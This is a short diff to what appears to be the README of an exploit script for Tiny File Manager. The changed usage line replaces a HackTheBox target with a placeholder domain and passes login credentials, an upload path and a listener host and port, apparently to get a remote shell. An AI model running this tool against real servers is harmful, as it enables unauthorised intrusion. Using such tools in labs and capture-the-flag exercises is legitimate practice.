@@ -12,7 +12,7 @@ python3 exploit.py -t 'http://hacked.rce/tinyfilemanager.php' -u username -p pas
 ```
 * Or
 ```
-python3 exploit.py -t 'http://soccer.htb/tiny/tinyfilemanager.php' -u username -p password -pr 'p' -ph 'directory/uploads' -lh 127.0.0.1 -lp 1337
+python3 exploit.py -t 'http://hacked.rce/tiny/tinyfilemanager.php' -u username -p password -pr 'p' -ph 'directory/uploads' -lh 127.0.0.1 -lp 1337
 ```
 
 ## Help
